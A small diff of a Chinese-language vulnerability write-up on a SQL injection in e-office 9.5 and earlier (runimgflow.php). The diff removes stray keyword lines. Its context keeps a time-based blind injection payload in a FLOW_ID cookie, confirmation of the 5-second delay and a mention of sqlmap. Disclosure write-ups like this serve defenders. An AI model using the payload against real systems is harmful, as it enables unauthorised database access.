@@ -22,14 +22,6 @@ e-office <=9.5
 
 general/workflow/runimgflow.php 业务逻辑如下
 
-深入探索
-
-内容管理系统
-
-搜索引擎
-
-代理
-
 ```
 <?php
 
@@ -55,14 +47,6 @@ Cookie: FLOW_ID=1 AND 7348=BENCHMARK(5000000,MD5(0x51747266))
 成功在延时 5 秒
 
 编程
-
-深入探索
-
-企业技术
-
-计算机科学
-
-书籍
 
 [sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
 
